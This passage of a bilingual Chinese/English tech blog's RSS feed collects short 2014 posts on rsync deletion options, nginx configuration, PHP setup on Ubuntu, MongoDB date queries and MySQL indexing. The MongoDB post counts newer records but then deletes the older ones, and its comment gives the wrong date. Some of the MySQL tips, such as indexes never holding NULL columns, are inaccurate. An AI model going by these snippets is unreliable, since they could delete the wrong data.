 杰杰 &lt;/a&gt;&amp;#160;问我rsync 的上传/删除文件的 具体顺序是怎样的。 我当时不清楚，所以赶紧学习了下： （ in my job, I need to rsync 500, 000 files to a server , totally in 1 GB file size. and I used the --delete option, so it's very important for me to know how rsync delete files)&amp;#160;&lt;/p&gt;
&lt;p&gt;总结： 应该使用 --delete --delete-after 选项。（两个同时存在）&lt;/p&gt;
&lt;p&gt;$ man rsync :&amp;#160;&lt;/p&gt;
&lt;p&gt;              The --delete option may be combined with  one  of  the  --delete-WHEN  options&lt;br /&gt;              without  conflict,  as  well  as  --delete-excluded.   However, if none of the&lt;br /&gt;              --delete-WHEN options are specified, rsync  will  choose  the  --delete-during&lt;br /&gt;              algorithm  when talking to rsync 3.0.0 or newer, and the --delete-before algo‐&lt;br /&gt;              rithm  when  talking  to  an  older  rsync.   See  also   --delete-delay   and&lt;br /&gt;              --delete-after. &amp;#160; &amp;#160; &amp;#160; ( 也就是说， --delete 选项可以跟 --delete-WHEN 一起使用，如果不指定 --delete-WHEN的话，就会默认使用 --delete-during 算法）&lt;/p&gt;
&lt;p&gt;       --delete-before&lt;br /&gt;              Request  that  the  file-deletions  on  the  receiving side be done before the&lt;br /&gt;              transfer starts.   See  --delete  (which  is  implied)  for  more  details  on&lt;br /&gt;              file-deletion. &amp;#160;( 在 接收方收到文件之前，先删掉 多余的文件。 适合 接收方磁盘空间不够的情况）&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;      --delete-during, --del&lt;br /&gt;              Request that the file-deletions on the receiving side be done incrementally as&lt;br /&gt;              the transfer happens.  The per-directory delete scan is done right before each&lt;br /&gt;              directory  is  checked  for  updates,  so  it  behaves  like  a more efficient&lt;br /&gt;              --delete-before, including doing the deletions prior to any per-directory fil‐&lt;br /&gt;              ter  files being updated. &amp;#160;（ 应该是 在每一个子目录被上传之前，先删掉目标目录中的文件。应该是一种 --delete-before. ）&lt;/p&gt;
&lt;p&gt;      --delete-delay （太长没看懂。。。需要先动手试一下，估计是先上传，再执行删除。。。）&lt;br /&gt;              Request that the file-deletions on the receiving side be computed  during  the&lt;br /&gt;              transfer  (like  --delete-during),  and  then  removed after the transfer com‐&lt;br /&gt;              pletes.  This is useful when combined with --delay-updates and/or --fuzzy, and&lt;br /&gt;              is more efficient than using --delete-after (but can behave differently, since&lt;br /&gt;              --delete-after computes the deletions in a separate pass after all updates are&lt;br /&gt;              done).   If the number of removed files overflows an internal buffer, a tempo‐&lt;br /&gt;              rary file will be created on the receiving side  to  hold  the  names  (it  is&lt;br /&gt;              removed while open, so you shouldn’t see it during the transfer).  If the cre‐&lt;br /&gt;              ation of the temporary file fails, rsync  will  try  to  fall  back  to  using&lt;br /&gt;              --delete-after  (which  it  cannot  do  if --recursive is doing an incremental&lt;br /&gt;              scan).  See --delete (which is implied) for more details on file-deletion. &amp;#160;&lt;/p&gt;
&lt;p&gt;       --delete-after (先上传， 再删除文件）&lt;br /&gt;              Request that the file-deletions on the receiving side be done after the trans‐&lt;br /&gt;              fer  has completed.  This is useful if you are sending new per-directory merge&lt;br /&gt;              files as a part of the transfer and you want their exclusions to  take  effect&lt;br /&gt;              for the delete phase of the current transfer.  It also forces rsync to use the&lt;br /&gt;              old, non-incremental recursion algorithm that requires rsync to scan  all  the&lt;br /&gt;              files  in  the  transfer  into memory at once (see --recursive).  See --delete&lt;br /&gt;              (which is implied) for more details on file-deletion.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;</description>
      <pubDate>Thu, 27 Mar 2014 21:08:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/deleting-files-in-rsync</link>
    </item>
    <item>
      <title>bundle install gems from local folder (bundle 从本地安装gem ) </title>
      <description>&lt;p&gt;refer to :&lt;a href="http://bundler.io/v1.5/bundle_install.html"&gt;http://bundler.io/v1.5/bundle_install.html&lt;/a&gt;, &lt;a href="http://bundler.io/v1.5/bundle_package.html"&gt;http://bundler.io/v1.5/bundle_package.html&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;基本上，就是先使用 &amp;#160; (first step, you should package the gems to vendor/cache folder)&lt;/p&gt;
&lt;p&gt;$ bundle package &amp;#160;# &amp;#160;自动把安装好的gem打包放到 vendor/cache目录下，&lt;/p&gt;
&lt;p&gt;$ bundle install --local # 就会从这个目录下安装gem file &amp;#160; ( and then, install the gems from your local vendor/cache folder )&amp;#160;&lt;/p&gt;
&lt;p&gt;另外， 在服务器上要注意： (also, notice that if you want to install gems in your production server: &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;$ bundle install --deployment #会安装gem 到服务器上。 这种安装是：把所有的gem都装到vendor/bundle文件夹中。而不是 ~/.gem 文件夹。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;$ bundle install --without development test 也适合安装gem 到服务器。 &amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 25 Mar 2014 23:11:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/bundle-install-gems-from-local-folder</link>
    </item>
    <item>
      <title>find how many files in a folder (快速查看某个目录下有多少文件）</title>
      <description>&lt;p&gt;有个项目会写静态文件，结果发现一次就要写22W个文件。。。。 用LS根本无法实现，所以。。。 ( if there are a huge number of files in a folder , you can't use 'ls' to find files, instead, we should use : find. &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;pre&gt;sg552@youku:/sg552/workspace/test_nginx/static_files_popup_page$ find . -type f | wc -l
220164

sg552@youku:/sg552/workspace/test_nginx/static_files_popup_page$ du . -h
906M	.
&lt;/pre&gt;</description>
      <pubDate>Tue, 18 Mar 2014 02:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/find-how-many-files-in-folder</link>
    </item>
    <item>
      <title>Fast way to delete files in linux (快速删除大量文件的方式）</title>
      <description>&lt;p&gt; refer to: &lt;a href="http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux" target="_blank"&gt;http://www.slashroot.in/which-is-the-fastest-method-to-delete-files-in-linux&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;result:  (conclusion:  using find is the safe way,  perl is the fastest, rsync is not a bad choice )

&lt;/p&gt;
&lt;pre&gt;COMMAND	TIME TAKEN
RM Command	Is not capable of deleting large number of files
Find Command with -exec	14 Minutes for half a million files
Find Command with -delete	5 Minutes for half a million files
Perl	1 Minute for half a million files
RSYNC with -delete	2 Minute 56 seconds for half a million files
&lt;/pre&gt;

</description>
      <pubDate>Mon, 17 Mar 2014 07:07:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/fast-way-to-delete-files</link>
    </item>
    <item>
      <title>nginx rewrite/try_file tips(nginx rewrite/try_files 小提示）</title>
      <description>&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/questions/22032751/how-to-process-dynamic-urls-as-static-pages-using-nginx" target="_blank"&gt;http://stackoverflow.com/questions/22032751/how-to-process-dynamic-urls-as-static-pages-using-nginx&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;最近，一个项目的请求让我们的Rails不足以负担（300 req /seconds是我们的极限），所以我打算把它做成静态化的页面，这样在我的 2核CPU上都可以轻松跑到15000 req/s. &amp;#160;( recently I am considering migrate our dynamic rails pages to static files served by Nginx which is much powerful than rails- 15k req/s v.s. 300 req/s. )&lt;/p&gt;
&lt;p&gt;于是我们的nginx 配置文件是： ( so our nginx config file looks like: )&lt;/p&gt;
&lt;pre&gt;  server {
    listen       100;
    charset utf-8;
    root /workspace/test_static_files;
    index index.html index.htm;
    location /popup_pages {
      log_subrequest on; 
      try_files /platform-$arg_platform-product-$arg_product.json /default.json;
#  DON'T use like below, nginx could not process underscore filenames mixing up with $arg_parameter_name:
#      try_files /platform_$arg_platform_product_$arg_product.json /default.json?q=$uri;
#      don't use rewrite ...  use try_files instead. 
#      rewrite ^/popup_pages /platform-$arg_platform-product-$arg_product.json;
    }   
  }

&lt;/pre&gt;
&lt;p&gt;几个小tips: (some tips) &lt;/p&gt;
&lt;p&gt;1. 不要使用下划线。 因为nginx无法正确判断 $arg_param 中的变量。 要使用横线'-'   (use '-' instead of underscore '_' in your static file names) 
&lt;/p&gt;
&lt;pre&gt;#      DON'T use like below, nginx could not process underscore filenames mixing up with $arg_parameter_name:
#      try_files /platform_$arg_platform_product_$arg_product.json /default.json?q=$uri;
&lt;/pre&gt;
&lt;p&gt;2. 尽量不要使用rewrite ，因为if is Evil ( If is evil, see: &lt;a href="http://wiki.nginx.org/IfIsEvil" target="_blank"&gt;http://wiki.nginx.org/IfIsEvil&lt;/a&gt; ) &lt;/p&gt;
&lt;pre&gt;#      Don't use rewrite ...  use try_files instead. 
#      rewrite ^/popup_pages /platform-$arg_platform-product-$arg_product.json;
&lt;/pre&gt;
&lt;p&gt; 3. 调试时，可以先使用 rewrite 来调试，调试完毕后，把它改写成 try_files. 调试rewrite 时，时刻关注access.log/error.log &lt;/p&gt;
</description>
      <pubDate>Sat, 15 Mar 2014 10:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nginx-try-files-and-rewrite-tips</link>
    </item>
    <item>
      <title>nginx built-in variables (nginx 内置的变量)</title>
      <description>&lt;p&gt;Nginx 这些变量非常有用， refer to: &lt;a href="http://wiki.nginx.org/HttpCoreModule#.24args" target="_blank"&gt;http://wiki.nginx.org/HttpCoreModule#.24args&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;The core module supports built-in variables, whose names correspond with the names of variables in Apache.&lt;/p&gt;
&lt;p&gt;First of all, there are variables which represent header lines in the client request, for example, $http_user_agent, $http_cookie, and so forth. Note that because these correspond to what the client actually sends, they are not guaranteed to exist and their meaning is defined elsewhere (e.g. in relevant standards).&lt;/p&gt;
&lt;p&gt;Furthermore, there are other variables:&lt;/p&gt;
&lt;p&gt;$arg_PARAMETER&lt;br /&gt;This variable contains the value of the GET request variable PARAMETER if present in the query string&lt;/p&gt;
&lt;p&gt;$args&lt;br /&gt;This variable is the GET parameters in request line, e.g. foo=123&amp;amp;bar=blahblah; This variable could be changed.&lt;/p&gt;
&lt;p&gt;$binary_remote_addr&lt;br /&gt;The address of the client in binary form;&lt;/p&gt;
&lt;p&gt;$body_bytes_sent&lt;br /&gt;The amount of bytes sent as part of the body of the response. Is accurate even when connections are aborted or interrupted.&lt;/p&gt;
&lt;p&gt;$content_length&lt;br /&gt;This variable is equal to line Content-Length in the header of request;&lt;/p&gt;
&lt;p&gt;$content_type&lt;br /&gt;This variable is equal to line Content-Type in the header of request;&lt;/p&gt;
&lt;p&gt;$cookie_COOKIE&lt;br /&gt;The value of the cookie COOKIE;&lt;/p&gt;
&lt;p&gt;$document_root&lt;br /&gt;This variable is equal to the value of directive root for the current request;&lt;/p&gt;
&lt;p&gt;$document_uri&lt;br /&gt;The same as $uri.&lt;/p&gt;
&lt;p&gt;$host&lt;br /&gt;This variable is equal to line Host in the header of request or name of the server processing the request if the Host header is not available.&lt;/p&gt;
&lt;p&gt;This variable may have a different value from $http_host in such cases: 1) when the Host input header is absent or has an empty value, $host equals to the value of server_name directive; 2)when the value of Host contains port number, $host doesn't include that port number. $host's value is always lowercase since 0.8.17.&lt;/p&gt;
&lt;p&gt;$hostname&lt;br /&gt;Set to the machine's hostname as returned by gethostname&lt;/p&gt;
&lt;p&gt;$http_HEADER&lt;br /&gt;The value of the HTTP request header HEADER when converted to lowercase and with 'dashes' converted to 'underscores', e.g. $http_user_agent, $http_referer...;&lt;/p&gt;
&lt;p&gt;$is_args&lt;br /&gt;Evaluates to "?" if $args is set, "" otherwise.&lt;/p&gt;
&lt;p&gt;$limit_rate&lt;br /&gt;This variable allows limiting the connection rate.&lt;/p&gt;
&lt;p&gt;$nginx_version&lt;br /&gt;The version of Nginx that the server is currently running;&lt;/p&gt;
&lt;p&gt;$query_string&lt;br /&gt;The same as $args except that this variable is readonly.&lt;/p&gt;
&lt;p&gt;$remote_addr&lt;br /&gt;The address of the client.&lt;/p&gt;
&lt;p&gt;$remote_port&lt;br /&gt;The port of the client;&lt;/p&gt;
&lt;p&gt;$remote_user&lt;br /&gt;This variable is equal to the name of user, authenticated by the Auth Basic Module;&lt;/p&gt;
&lt;p&gt;$request_filename&lt;br /&gt;This variable is equal to path to the file for the current request, formed from directives root or alias and URI request;&lt;/p&gt;
&lt;p&gt;$request_body&lt;br /&gt;This variable(0.7.58+) contains the body of the request. The significance of this variable appears in locations with directives proxy_pass or fastcgi_pass.&lt;/p&gt;
&lt;p&gt;$request_body_file&lt;br /&gt;Client request body temporary filename;&lt;/p&gt;
&lt;p&gt;$request_completion&lt;br /&gt;Set to "OK" if request was completed successfully. Empty if request was not completed or if request was not the last part of a series of range requests.&lt;/p&gt;
&lt;p&gt;$request_method&lt;br /&gt;This variable is equal to the method of request, usually GET or POST.&lt;/p&gt;
&lt;p&gt;This variable always evaluates to the method name of the main request, not the current request, when the current request is a subrequest.&lt;/p&gt;
&lt;p&gt;$request_uri&lt;br /&gt;This variable is equal to the *original* request URI as received from the client including the args. It cannot be modified. Look at $uri for the post-rewrite/altered URI. Does not include host name. Example: "/foo/bar.php?arg=baz"&lt;/p&gt;
&lt;p&gt;$scheme&lt;br /&gt;The HTTP scheme (i.e. http, https). Evaluated only on demand, for example:&lt;/p&gt;
&lt;p&gt;rewrite  ^  $scheme://example.com$uri  redirect;&lt;br /&gt;$sent_http_HEADER&lt;br /&gt;The value of the HTTP response header HEADER when converted to lowercase and with 'dashes' converted to 'underscores', e.g. $sent_http_cache_control, $sent_http_content_type... .&lt;/p&gt;
&lt;p&gt;$server_addr&lt;br /&gt;The server address. Generally nginx makes a system call to obtain this value. To improve efficiency and avoid this system call, specify an address with the listen directive and to use the bind parameter.&lt;/p&gt;
&lt;p&gt;$server_name&lt;br /&gt;The name of the server.&lt;/p&gt;
&lt;p&gt;$server_port&lt;br /&gt;This variable is equal to the port of the server, to which the request arrived;&lt;/p&gt;
&lt;p&gt;$server_protocol&lt;br /&gt;This variable is the protocol of the request. Common examples are: HTTP/1.0 or HTTP/1.1&lt;/p&gt;
&lt;p&gt;$uri&lt;br /&gt;This variable is the current request URI, without any arguments (see $args for those). This variable will reflect any modifications done so far by internal redirects or the index module. Note this may be different from $request_uri, as $request_uri is what was originally sent by the browser before any such modifications. Does not include the protocol or host name. Example: /foo/bar.html&lt;/p&gt;</description>
      <pubDate>Sat, 15 Mar 2014 09:25:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nginx-built-in-variables</link>
    </item>
    <item>
      <title>我们就差一个写代码的了。( everything is ready, except a coder) </title>
      <description>&lt;p&gt;知乎是一个中文问答社区，虽然stackoverflow已经非常强大了，但是知乎所具有的中国特色仍然具有强大的生命力。&lt;/p&gt;
&lt;p&gt;今天看到的这个文章非常有意思：&lt;a href="http://www.zhihu.com/question/22989105" target="_blank"&gt;http://www.zhihu.com/question/22989105&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;引用几句有意思的话:&lt;/p&gt;
&lt;p&gt;-- 酱油和醋都准备好了，就差你带点儿饺子过来了！&lt;/p&gt;
&lt;p&gt;-- google的搜索框看起来那么简单，半小时能不能搞好？&lt;/p&gt;</description>
      <pubDate>Sat, 15 Mar 2014 08:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/everything-is-ready-except-a-coder</link>
    </item>
    <item>
      <title>显示某个目录的结构 ( show folder structures ) </title>
      <description>&lt;p&gt;显示某个目录的结构&lt;/p&gt;
&lt;p&gt;$ find ./ -type d &amp;#160;&lt;/p&gt;
&lt;p&gt;$ tree -d /opt/files&lt;/p&gt;
&lt;p&gt;	see: &lt;a href="http://stackoverflow.com/questions/3455625/linux-command-to-print-directory-structure-in-the-form-of-a-tree" target="_blank"&gt;http://stackoverflow.com/questions/3455625/linux-command-to-print-directory-structure-in-the-form-of-a-tree&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Wed, 12 Mar 2014 02:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/show-folder-structure</link>
    </item>
    <item>
      <title>delete mongodb data by date(根据日期来查询/删除mongodb ) </title>
      <description>&lt;p&gt;mongoDB 操作起来不是很直观啊。 例如，&lt;/p&gt;

&lt;pre&gt;# 查询 2014年4月24日之后建立的数据：  (find them) 
start = new Date(2014,3,25);
db.logs.find({created_at: { $gt: start}}).count()  # =&amp;gt;   1254450
# 删除 它们  (remove them) 
db.logs.remove({created_at: { $lt: start}});
&lt;/pre&gt;
</description>
      <pubDate>Tue, 11 Mar 2014 05:56:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/delete-mongodb-data-by-date</link>
    </item>
    <item>
      <title>设置 手机访问新浪邮箱 ( access my sina email via phone)</title>
      <description>&lt;p&gt;1. set the pop3/stmp: &amp;#160;pop.sina.com &amp;#160; smtp.sina.com, using the default port. &amp;#160;( notice: it's pop.sina.com, but not pop3.sina.com )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. input username/password.&lt;/p&gt;
&lt;p&gt;done.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sun, 09 Mar 2014 01:12:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/access-sina-mail-via-phone</link>
    </item>
    <item>
      <title>apache + php 环境 </title>
      <description>&lt;p&gt;非常简单：&lt;/p&gt;
&lt;pre&gt;   apt-get install apache2
   apt-get install libapache2-mod-php5
&lt;/pre&gt;</description>
      <pubDate>Sat, 08 Mar 2014 06:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/apache-with-php</link>
    </item>
    <item>
      <title>setup php environment on bare ubuntu(在ubuntu上搭建php环境）</title>
      <description>&lt;p&gt;UBUNTU 10：&amp;#160;&lt;br /&gt;参考：(refer to : &lt;a href="https://gist.github.com/DaRaFF/3995789"&gt;https://gist.github.com/DaRaFF/3995789&lt;/a&gt;)&lt;br /&gt;PHP官方的文档简直没有可读性，摸索了一天，归纳出来了：&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ sudo apt-get install libapr1-dev libxml2-dev  libxslt-dev mysql-server libmysqlclient-dev
 curl build-essential libssl-dev libreadline-dev libopenssl-ruby build-essential 
 libssl-dev libreadline-dev vim git-core
&lt;/pre&gt;
&lt;pre&gt;$aptitude install php5-cgi php5-mysql php5-fpm php5-curl php5-gd php5-idn php-pear php5-imagick php5-imap php5-mcrypt php5-memcache php5-mhash php5-ming php5-pspell php5-recode php5-snmp php5-sqlite php5-tidy php5-xmlrpc php5-xsl php5-fpm

$ sudo apt-get install php5-cli php5-common php-apc php-pear php5-xdebug php5-curl php5 php5-dev
sudo apt-get install php5-xsl
sudo apt-get install php5-intl
$ sudo apt-get install gcc g++ libpcre++-dev zlib1g-dev make&amp;#160;
$ apt-get install nginx php5-fpm php5  （这一步很关键）
$ apt-get install graphicsmagick libgraphicsmagick1-dev

&lt;/pre&gt;
&lt;p&gt;修改配置文件： （这一步也很关键 this is the key! )&lt;/p&gt;
&lt;pre&gt;# 
#edit listen port in /etc/php5/fpm/pool.d/www.conf
 32 ; Note: This value is mandatory.
 33 ;listen = 127.0.0.1:9009
 34 listen = /var/run/php5-fpm.sock

# nginx server config
  server {
    listen       80; 
    server_name  www.weixin.pe weixin.pe;
    charset utf-8;
    root /opt/weixin_cms/upload;
    index index.html index.htm index.php;
    location / { 
      try_files $uri $uri/ /index.php;
    }   
    location ~ \.php$ {
      try_files $uri =404;
      fastcgi_pass unix:/var/run/php5-fpm.sock;
      fastcgi_index index.php;
      fastcgi_param SCRIPT_FILENAME html$fastcgi_script_name;
      include fastcgi_params;
    }   
  }


&lt;/pre&gt;

&lt;p&gt;then comes to setup the DB and PHP config:&amp;#160;&lt;/p&gt;
&lt;p&gt;1.&amp;#160;create database weixin_cms default charset utf8 COLLATE utf8_general_ci;&lt;/p&gt;
&lt;p&gt;2. use weixin_cms;&lt;/p&gt;
&lt;p&gt;3. source pigcms.sql;&lt;/p&gt;
&lt;p&gt;4.然后修改conf目录下的db.php数据库连接文件即可完成安装 ( access www.weixin.pe will show the result page)&lt;/p&gt;</description>
      <pubDate>Wed, 05 Mar 2014 10:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-php-env-on-bare-ubuntu</link>
    </item>
    <item>
      <title>接口系统对于异常的处理 (exceptions in web interface design)</title>
      <description>&lt;p&gt;目前对于异常有两种处理： (there're 2 ways for exception process )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 不处理。 直接抛出。让客户能看到，方便开发人员的处理。 典型的是使用exception_notification 这样的插件， 遇到异常，直接给开发人员邮件。 &amp;#160;( just throw it so that developers could find what is happening very easily. in Rails 3, we use a rubygem named 'exception notification' )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 处理这个异常。把它进行 begin... rescue (ruby ) 或者 try...catch (java) 这样的处理。 但是要记得把错误记录在日志中。 &amp;#160; ( in ruby, we use begin/rescue and in java: try/catch block to make sure there's no error when exception thrown. but remember to log the errors into file )&amp;#160;&lt;/p&gt;
&lt;p&gt;方案1 适合低访问量的网站。 &amp;#160;因为优酷的访问量非常大，目前是每秒100个请求，所以一旦出错，每秒就发送x个邮件。对系统的资源影响很大。 所以第二个方案在这个情况下就特别合适了。 &amp;#160;( plan 1 fits the websites that don't have huge visitors, because when exception thrown, the server would send many many emails per second which costs heavy system resources. so plan 2 is our choice , especially in youku.com, we have at least 100 req/s. &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;如果一旦使用了方案2， 要记得给出假数据。 &amp;#160;保证客户端有内容可以取到。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 28 Feb 2014 02:05:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/exceptions-in-webservice-design</link>
    </item>
    <item>
      <title>动态web页面 的速度跟nginx服务下的静态页面的支持速度，天壤之别啊。 (dynamic pages is so slow comparing to static pages served by nginx)</title>
      <description>&lt;p&gt;今天心血来潮，比较了一下静态服务器和动态WEB服务器，在同样并发下的相应速度。 前者是后者速度的50倍。 
在我的机器上轻松支撑到 15K req/s, 而 使用了cache的 rails : 300 req/s.  哎。。。 (in short: nginx serving static page is 50 faster then rails server using cache)&lt;/p&gt;
&lt;p&gt;thin: &amp;#160;&lt;/p&gt;
&lt;pre&gt;Concurrency Level:      1000
Time taken for tests:   3.068 seconds
Complete requests:      1000
Failed requests:        0
Write errors:           0
Total transferred:      574000 bytes
HTML transferred:       311000 bytes
Requests per second:    325.98 [#/sec] (mean)
Time per request:       3067.652 [ms] (mean)
Time per request:       3.068 [ms] (mean, across all concurrent requests)
Transfer rate:          182.73 [Kbytes/sec] received

&lt;/pre&gt;
&lt;p&gt;nginx:&lt;/p&gt;
&lt;pre&gt;Concurrency Level:      1000
Time taken for tests:   0.068 seconds
Complete requests:      1000
Failed requests:        1000
   (Connect: 0, Receive: 0, Length: 766, Exceptions: 234)
Write errors:           0
Non-2xx responses:      481
Total transferred:      415286 bytes
HTML transferred:       271101 bytes
Requests per second:    14735.35 [#/sec] (mean)
Time per request:       67.864 [ms] (mean)
Time per request:       0.068 [ms] (mean, across all concurrent requests)
Transfer rate:          5975.96 [Kbytes/sec] received

&lt;/pre&gt;</description>
      <pubDate>Sun, 23 Feb 2014 07:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/dynamic-page-and-static-page-comparison</link>
    </item>
    <item>
      <title>php:  Call to undefined function: imagecreate()  </title>
      <description>&lt;p&gt;solution is quit simple:&amp;#160;&lt;/p&gt;
&lt;p&gt;refer to: &amp;#160;http://www.php.net/manual/en/image.installation.php&lt;/p&gt;
&lt;div&gt;&lt;p&gt;$ sudo apt-get install php5-gd&lt;/p&gt;
&lt;/div&gt;</description>
      <pubDate>Thu, 20 Feb 2014 11:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/php-error-imagecreate</link>
    </item>
    <item>
      <title>php: curl init not found</title>
      <description>&lt;p&gt;in ubuntu, you need to install php5-curl:&lt;/p&gt;
&lt;p&gt;$&amp;#160;aptitude install php5-curl&lt;/p&gt;
&lt;p&gt;$&amp;#160;/etc/init.d/php5-fpm restart &amp;#160; # remember to do this&lt;/p&gt;</description>
      <pubDate>Thu, 20 Feb 2014 11:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/curl-init-not-found</link>
    </item>
    <item>
      <title>git log show exact date</title>
      <description>&lt;p&gt;git log --pretty=format:"%H %an %ad"&lt;/p&gt;</description>
      <pubDate>Thu, 20 Feb 2014 06:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/git-log-show-exact-date</link>
    </item>
    <item>
      <title>mysql中的index (index in mysql)</title>
      <description>&lt;p&gt;refer to: &lt;a href="https://dev.mysql.com/doc/refman/5.0/en/mysql-indexes.html" target="_blank"&gt;https://dev.mysql.com/doc/refman/5.0/en/mysql-indexes.html&lt;/a&gt;,&amp;#160;&lt;br /&gt;&lt;a href="http://database.51cto.com/art/200910/156685.htm" target="_blank" style="background-color: transparent;"&gt;http://database.51cto.com/art/200910/156685.htm&lt;/a&gt; and&amp;#160;
&lt;a href="http://www.cnblogs.com/hustcat/archive/2009/10/28/1591648.html" target="_blank" style="background-color: transparent;"&gt;http://www.cnblogs.com/hustcat/archive/2009/10/28/1591648.html&lt;/a&gt;, &lt;a href="http://www.php100.com/html/webkaifa/database/Mysql/2013/0316/12223.html" target="_blank"&gt;http://www.php100.com/html/webkaifa/database/Mysql/2013/0316/12223.html&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;项目中有个日志表，记录了用户的所有操作。前些天发现这个表比较大了， 33万行记录。每次打开都耗时很久（10秒左右）。所以需要优化一下。&lt;/p&gt;
&lt;pre&gt;mysql &amp;gt; select count(*) from cms_new_logs ;  # =&amp;gt;  259959
mysql &amp;gt; select * from cms_new_logs where user_name = 'shensiwei@youku.com';  # =&amp;gt; 1.11s 
mysql &amp;gt; create index index_for_username on cms_new_logs( user_name ( 25 )); # =&amp;gt; 60.33s
mysql &amp;gt; select * from cms_new_logs where user_name = 'shensiwei@youku.com';  # =&amp;gt; 0.66s 
mysql &amp;gt; select * from cms_new_logs where user_name = 'shensiwei@youku.com';  # =&amp;gt; 0.12s 
&lt;/pre&gt;

&lt;p&gt;使用索引时，有以下一些技巧和注意事项：&lt;/p&gt;
&lt;p&gt;◆索引不会包含有NULL值的列&lt;/p&gt;
&lt;p&gt;只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。&lt;/p&gt;
&lt;p&gt;◆使用短索引&lt;/p&gt;
&lt;p&gt;对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的列，如果在前10个或20个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。&lt;/p&gt;
&lt;p&gt;◆索引列排序&lt;/p&gt;
&lt;p&gt;MySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。&lt;/p&gt;
&lt;p&gt;◆like语句操作&lt;/p&gt;
&lt;p&gt;一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引，而like “aaa%”可以使用索引。&lt;/p&gt;
&lt;p&gt;◆不要在列上进行运算&lt;/p&gt;
&lt;p&gt;select * from users where YEAR(adddate)&amp;lt;2007; 将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成&lt;/p&gt;
&lt;p&gt;select * from users where adddate&amp;lt;‘2007-01-01’; &lt;/p&gt;
&lt;p&gt;◆不使用NOT IN和&amp;lt;&amp;gt;操作
&lt;/p&gt;
</description>
      <pubDate>Mon, 17 Feb 2014 02:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/index-in-mysql</link>
    </item>
    <item>
      <title>mark down 的语法( mark down grammar)</title>
      <description>refer to : &lt;a href="http://guides.github.com/overviews/mastering-markdown/" target="_blank"&gt;http://guides.github.com/overviews/mastering-markdown/&lt;/a&gt;
and &lt;a href="https://help.github.com/articles/github-flavored-markdown" target="_blank"&gt;https://help.github.com/articles/github-flavored-markdown&lt;/a&gt;
&lt;p&gt;
ruby code: &lt;/p&gt; 
&lt;pre&gt;```ruby
require 'redcarpet'
markdown = Redcarpet.new("Hello World!")
puts markdown.to_html
```
&lt;/pre&gt;
&lt;p&gt;It's very easy to make some words &lt;strong&gt;bold&lt;/strong&gt; and other words &lt;em&gt;italic&lt;/em&gt; with Markdown. You can even link to &lt;a&gt;Google!&lt;/a&gt;
&lt;/p&gt;
&lt;pre&gt;It's very easy to make some words **bold** and other words *italic* with Markdown. You can even [link to Google!](http://google.com).
&lt;/pre&gt;
&lt;p&gt; headers: 
&lt;/p&gt;
&lt;pre&gt;# This is an &amp;lt;h1&amp;gt; tag
## This is an &amp;lt;h2&amp;gt; tag
###### This is an &amp;lt;h6&amp;gt; tag&lt;/pre&gt;

&lt;p&gt;Lists and others &lt;/p&gt;
&lt;pre&gt;

Unordered

* Item 1
* Item 2
  * Item 2a
  * Item 2b
Ordered

1. Item 1
2. Item 2
3. Item 3
   * Item 3a
   * Item 3b
Images

![GitHub Logo](/images/logo.png)
Format: ![Alt Text](url)
Links

http://github.com - automatic!
[GitHub](http://github.com)
Blockquotes

As Kanye West said:

&amp;gt; We're living the future so
&amp;gt; the present is our past.
&lt;/pre&gt;</description>
      <pubDate>Sun, 16 Feb 2014 00:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/markdown-grammar</link>
    </item>
    <item>
      <title>django 安装auth 模块 (install django auth) </title>
